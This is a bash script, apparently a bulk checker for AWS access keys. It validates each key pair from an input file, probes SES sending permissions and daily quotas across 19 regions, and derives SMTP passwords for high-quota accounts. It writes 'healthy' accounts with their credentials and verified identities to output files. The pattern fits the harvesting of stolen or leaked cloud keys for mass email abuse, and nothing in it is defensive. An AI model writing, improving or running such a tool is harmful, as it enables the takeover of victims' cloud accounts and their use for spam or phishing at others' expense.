#!/bin/bash


check_send_quota() {
    export AWS_DEFAULT_REGION=$1
    aws ses get-send-quota > /dev/null 2>&1
    if [[ $? -eq 0 ]]; then
        quota=$(aws ses get-send-quota | jq '.Max24HourSend')
        echo -e "\e[33m[INFO]\e[39m Max 24h send quota for ${AWS_DEFAULT_REGION}: $quota mails."
        echo -e "${AWS_ACCESS_KEY_ID}:${AWS_SECRET_ACCESS_KEY}:${AWS_DEFAULT_REGION} ($quota per day)" >> smtp/aws_smtp.txt
        if [ $quota -ge 50000 ]; then
            echo -e "\e[92m[OK]\e[39m Creating smtp credentials..."
            smtppass=$(python3 ses_password.py "${AWS_SECRET_ACCESS_KEY}" "${AWS_DEFAULT_REGION}")
            output="$(echo -n "$i" | cut -d ':' -f1,2):${AWS_DEFAULT_REGION} [$quota mail/day]\nhost: email-smtp.${AWS_DEFAULT_REGION}.amazonaws.com\nport: 587\nuser: ${AWS_ACCESS_KEY_ID}\npassword: $smtppass\n$(aws ses list-identities)\n\n\n"
            echo -e "$output" >> smtp/aws_smtp_hq.txt
            aws sesv2 get-account &>/dev/null
            if [[ $? -eq 0 ]]; then
                echo -e "${i}" >> smtp/aws_perms_sesv2.txt
	        salut=$(aws sesv2 get-account)
	        if ! grep -q "SHUTDOWN" <<< $salut; then
		    echo -e "\e[92m[OK]\e[39m ${AWS_ACCESS_KEY_ID} [$quota mail/day] HEALTHY"
                    echo -e "$output" >> smtp/healthy_aws_smtp.txt
                else
                    echo -e "\e[91m[FAIL]\e[39m ${AWS_ACCESS_KEY_ID} [$quota mail/day] not HEALTHY (check manually) on panel"
                fi
            fi
            continue 2
        fi
    fi
}

declare -a arr=("us-east-1" "us-east-2" "us-west-1" "us-west-2" "af-south-1" "ap-south-1" "ap-northeast-2" "ap-southeast-1" "ap-southeast-2" "ap-northeast-1" "ca-central-1" "eu-central-1" "eu-west-1" "eu-west-2" "eu-south-1" "eu-west-3" "eu-north-1" "me-south-1" "sa-east-1")
for i in $(tac $1); do
    echo -e "\n"
    export AWS_ACCESS_KEY_ID=$(echo -n "$i" | cut -d':' -f1)
    export AWS_SECRET_ACCESS_KEY=$(echo -n "$i" | cut -d':' -f2)
    export AWS_DEFAULT_REGION="us-east-1"
    aws sts get-caller-identity > /dev/null 2>&1
    if [[ $? -eq 0 ]]; then
        echo -e "\e[92m[OK]\e[39m ${AWS_ACCESS_KEY_ID} is valid."
        echo "$i" >> smtp/aws_valid.txt
        echo -e "\e[33m[INFO]\e[39m checking for ses permissions..."
        aws ses get-send-quota > /dev/null 2>&1
        if [[ $? -eq 0 ]]; then
            echo -e "\e[92m[OK]\e[39m ${AWS_ACCESS_KEY_ID} has ses permissions ! :)"
            for region in "${arr[@]}"; do
                check_send_quota $region
            done
        else
            echo -e "\e[91m[ERROR]\e[39m ${AWS_ACCESS_KEY_ID} has not ses permissions. :("
        fi
    else
        echo -e "\e[91m[ERROR]\e[39m ${AWS_ACCESS_KEY_ID} is invalid."
    fi
done
